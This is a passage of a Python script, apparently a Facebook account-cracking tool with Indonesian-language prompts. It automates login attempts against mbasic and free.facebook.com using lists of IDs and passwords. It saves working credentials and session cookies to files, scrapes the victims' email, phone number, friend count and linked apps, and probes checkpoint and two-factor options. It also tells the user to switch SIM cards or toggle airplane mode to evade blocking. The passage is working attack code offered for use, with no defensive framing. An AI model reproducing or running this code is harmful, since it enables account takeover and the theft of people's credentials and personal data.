"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            readable = str(time.time()).split('.')[0]
            p = ses.get(link,headers=eader)
            a=sop(p.text,'html.parser')
            porm=a.find('form')
            dat=['lsd','jazoest','m_ts','li','try_number','unrecognized_tries','email','pass','login','bi_xrwh']
            dataa={}
            for anj in porm('input'):
                if anj.get('name') in dat:
                    if 'pass' ==anj.get('name'):
                        dataa.update({anj.get('name'): pw})
                    elif 'email' in anj.get('name'):
                        dataa.update({anj.get('name'): idf})
                    else:
                        dataa.update({anj.get('name'):anj.get('value')})
            dataa.update({'_fb_noscript': 'true'})
            aksi=re.search('action="(.*?)"',str(p.text)).group(1)
            aksiku=''
            aksi1=aksi.split('amp;')
            for aksi2 in aksi1:
                aksiku+=aksi2
            lenght = ("&").join([ "%s=%s" % (key, value) for key, value in dataa.items() ])
            ua = random.choice(ugen)
            header1 = {
"Host":"mbasic.facebook.com",
"content-length": str(len(lenght)),
"cache-control":"max-age=0",
"upgrade-insecure-requests":"1",
"origin":"https://mbasic.facebook.com",
"content-type":"application/x-www-form-urlencoded",
"user-agent":ua,
"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"x-requested-with":"xmlhttprequests",
"sec-fetch-site":"same-origin",
"sec-fetch-mode":"cors",
"sec-fetch-user":"empty",
"sec-fetch-dest":"document",
"referer": str(p.url),
"accept-encoding":"gzip, deflate br",
"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post('https://mbasic.facebook.com'+aksiku,data=dataa,allow_redirects=True,headers=header1)
            if "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    token=open('.token.txt','r').read()
                    token1=open('.cookie.txt','r').read()
                    head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
                    koh2 = requests.get('https://graph.facebook.com/v1.0/'+idf+'?fields=birthday,name,id&access_token='+token,cookies={'cookie': token1},headers=head).json()
                    ttl=koh2['birthday']
                except:
                    ttl='-'
                if 'ya' in oprek:
                    try:
                        open('/sdcard/CHI-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
                    except:
                        open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
                    cp+=1
                    idfs=idf
                    pws=pw
                    tl=ttl
                    cekopsii(idfs,pws,tl)
                    break
                else:
                    cp+=1
                    print('\r\n')
                    statuscp = f'\r{M}[+] USER       : {idf} \n{M}[+] PASSWORD : {pw}'
                    print('\r'+statuscp)
                    linex()
                    try:
                        open('/sdcard/CHI-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
                    except:
                        open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
                break
            elif "xs" in ses.cookies.get_dict().keys():
                if 'no' in taplikasi:
                    ok+=1
                    headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                    if 'no' in taplikasi:
                        coki=po.cookies.get_dict()
                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                        try:
                            open('/sdcard/CHI-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                        except:    
                            open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                        print('\n')
                        statusok = f'{H}[+] USER       : {idf}\n[+] PASSWORD : {pw}\n[+] COOKIES  : {kuki}\n {ua}{C}\n'
                        print('\r'+statusok)
                        linex()
                        break
                else:
                    ok+=1
                    headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/sdcard/CHI-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                    infoakun = ""
                    session = requests.Session()
                    emhp=requests.get('https://mbasic.facebook.com/profile.php?v=info',cookies=coki,headers=headapp).text
                    try:
                        email=re.search('target="_blank">(.*?)&#064;(.*?)<',str(emhp)).groups(1)
                        infoakun+= (f"[•] EMAIL : {email[0]}@{email[1]}\n")
                    except:
                        infoakun+= (f"[•] EMAIL : - \n")
                    try:
                        nohp=re.search('>08(.*?)-(.*?)-(.*?)</span>',str(emhp)).groups(1)
                        infoakun+= (f"[•] PHONE NUMBER : 08{nohp[0]}{nohp[1]}{nohp[2]}\n")
                    except:
                        infoakun+= (f"[•] PHONE NUMBER : - \n")
                    try:
                        tems=session.get('https://mbasic.facebook.com/profile.php?id='+idf+'&v=friends',cookies=coki,headers=headapp).text
                        teman=re.search('>Teman (.*?)<',str(tems)).groups(1)
                        tem=teman[0].split('(')
                        temm=tem[1].split(')')
                        infoakun+= (f"[•] FRIEND : {temm[0]}\n")
                    except:
                        infoakun+= (f"[•] FRIEND : - \n")
                    try:
                        tahs=session.get('https://mbasic.facebook.com/'+idf+'/allactivity/?entry_point=settings_yfi&settings_tracking=mbasic_footer_link%3Asettings_2_0&privacy_source=your_facebook_information&_rdr',cookies=coki,headers=headapp).text
                        tah=re.findall('id="year_(.*?)"',str(tahs))
                        tahu=(len(tah)-1)
                        tahun=tah[tahu]
                        infoakun+= (f"[•] YEAR ACCOUNT : {tahun}\n")
                    except:
                        infoakun+= (f"[•] YEAR ACCOUNT : - \n")


                    cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                    cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    infoakun += (f"\n[•] LIST ACTIVE APPLICATIONS : \n")
                    apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
                    nok=1
                    for muncul in apkaktif:
                        infoakun+= (f"    [{nok}] {muncul[0]} {muncul[1]}\n")
                        nok+=1

                    hit=0
                    infoakun += (f"\n[•] LIST EXPIRED APPLICATIONS :\n")
                    apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
                    hit=0
                    for muncul in apkexp:
                        hit+=1
                        infoakun += (f"    [{hit}] {muncul[0]} {muncul[1]}\n")
                    print('\n')
                    statusok = f'\r[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
                    welcome=f'''{H}╭────────────────────────────────────────────────────────────╮
│                         SUCCESSFUL                        │
╰────────────────────────────────────────────────────────────╯'''                   
                    print(f'\r{welcome}\n{statusok}{C}')
                    break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(10)

    loop+=1


def cek_opsi():
    c = len(akun)
    hu = '  [C] Terdapat %s Akun Untuk Dicek\n  [C]Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
    print(hu)
    input(x+'['+h+'•'+x+'] Mulai')
    welcome=f'''╭────────────────────────────────────────────────────────────╮
│                   PROCESS COMPLETED                  │
╰────────────────────────────────────────────────────────────╯'''                   
    print(welcome)
    love = 1
    for kes in akun:
        try:
            idfs,pws ,tl= kes.split('|')[0],kes.split('|')[1],kes.split('|')[2]
        except:
            idfs,pws= kes.split('|')[0],kes.split('|')[1]
            tl='-'
        print('\r[C] PROCESSING ID [ %s ] [ %s/%s]'%(idfs,love,len(akun)));sys.stdout.flush()
        cekopsii(idfs,pws,tl)
        love+=1
    welcome=f'''╭────────────────────────────────────────────────────────────╮
│                             {H}DONE{C}                           │
╰────────────────────────────────────────────────────────────╯'''                   
    print(welcome)
    exit()
def cekopsii(id,pw,ttl):
    try:
        ua = 'Mozilla/5.0 (Linux; Android 12; SM-S906E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36'
        req=requests.Session()
        head={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '""Google Chrome";v="103""','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/','accept-language': 'en-US;q=0.8,en;q=0.7'}
        a=sop(req.get('https://free.facebook.com/?locale=id_ID&_rdr').text,'html.parser')
        porm=a.find('form')
        dataa = {}
        lion = ['lsd','jazoest','m_ts','li','try_number','unrecognized_tries','email','pass','login','bi_xrwh']
        for anj in porm('input'):
            if anj.get('name') in lion:
                if 'pass' ==anj.get('name'):
                    dataa.update({anj.get('name'): pw})
                elif 'email' in anj.get('name'):
                    dataa.update({anj.get('name'): id})
                else:
                    dataa.update({anj.get('name'):anj.get('value')})
        b=sop(req.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=id_ID&refid=8',data=dataa,headers=head,allow_redirects=True).text,'html.parser')
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
        coki=req.cookies.get_dict()
        if "checkpoint" in req.cookies.get_dict().keys():
            try:
                ampromm=b.find('form')
                amdat=['fb_dtsg','jazoest','jazoest','checkpoint_data=','submit[Continue]','nh']
                amdata={}
                for enj in ampromm('input'):
                    if enj.get('name') in amdat:
                        amdata.update({enj.get('name'):enj.get('value')})
                cc=req.post('https://mbasic.facebook.com/login/checkpoint/?locale2=id_ID', cookies=coki, headers=head,data=amdata).text
                c=sop(cc,'html.parser')
                opsi=c.find_all('option')
                no=1
                opsinya=''
                print('\r\n')
                for opsii in opsi:
                    opsinya+=f'	[{no}] {opsii.text} \n'
                    no+=1
                if opsinya=='':
                    try:
                        open('/sdcard/CHI-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
                    except:
                        open('TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
                    
                    statusok = f'{K}    [+] ID       : {id}\n    [+] PASSWORD : {pw}\n    [+] CHECKPOINT OPTION   : TAP YES / A2F ON{C}'
                    print(statusok)
                else:
                    
                    statusok = f'\r{K}    [+] ID       : {id}\n    [+] PASSWORD : {pw}\n    [+] BIRTHDAY            : {ttl}\n    [+] CHECKPOINT OPTION   :\n {opsinya}{C}'
                    print(statusok)
            except:
                print('\n\r')
               
                statusok = f'\r{K}    [+] ID       : {id}\n    [+] PASSWORD : {pw}\n    [+] CHECKPOINT OPTION   : FAILED CEK OPSI{C}'
                print(statusok)
        
        
        elif "c_user" in req.cookies.get_dict().keys():
            print('\n\r')
            welcome=f'''╭────────────────────────────────────────────────────────────╮
│                         {H}SUCCESSFUL{C}                        │
╰────────────────────────────────────────────────────────────╯'''         
            print(welcome)
            try:
                open('/sdcard/CHI-DATA/OK/'+okc,'a').write(id+'|'+pw+kuki+'\n')
            except:
                open('OK/'+okc,'a').write(id+'|'+pw+kuki+'\n')
            statusok = f'\r{H}    [+] ID       : {id}\n    [+] PASSWORD : {pw}\n    [+] CHECKPOINT OPTION   : ACCOUNT OK{C}'
            print(statusok)
        else:
            print('\n\r')
            welcome=f'''╭────────────────────────────────────────────────────────────╮
│                     {M}CHECK-POINT{C}                    │
╰────────────────────────────────────────────────────────────╯'''         
            print(welcome)
            statusok = f'\r{M}    [+] ID : {id}    [+] PASSWORD : {pw}\n    [+] CHECKPOINT OPTION   : WRONG PASSWORD{C}'
            print(statusok)
    except requests.exceptions.ConnectionError:
        time.sleep(20)
        cekopsii(id, pw,ttl)

def tipsx():
    print('NEXT UPDATE BRO')
if __name__=='__main__':
    Main()